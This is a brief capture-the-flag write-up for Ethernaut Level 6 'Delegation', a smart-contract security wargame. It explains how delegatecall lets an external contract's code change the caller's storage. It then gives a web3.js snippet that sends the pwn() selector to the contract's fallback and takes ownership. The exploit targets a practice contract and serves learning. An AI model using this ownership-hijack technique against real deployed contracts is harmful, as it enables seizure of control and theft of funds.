# Level6 - Delegation

- [link to challenge](https://ethernaut.zeppelin.solutions/level/0x68756ad5e1039e4f3b895cfaa16a3a79a5a73c59)

# Issue

Delegatecall executes an external contracts code insdie the context of the calling contract meaning that code in the external contract affects variables inside the calling contract. This feature enables libraries to be called but can also lead to vulernabilies.

In this instance, we invoke the fallback function on Delegation and get it to call the pwn() method on Deletegate which sets the Delegation owner to msg.sender (us).

# Solution

```
var to = "0x5084a9d0604cdeeb58e36debc06d432451da0a34"
var from = eth.accounts.wallet[0].address
var data = web3.utils.sha3("pwn()").substring(0,10) // ie: "0xdd365b8b"
web3.eth.sendTransaction({ to, from, data, gas, gasPrice }).then(console.log)
```
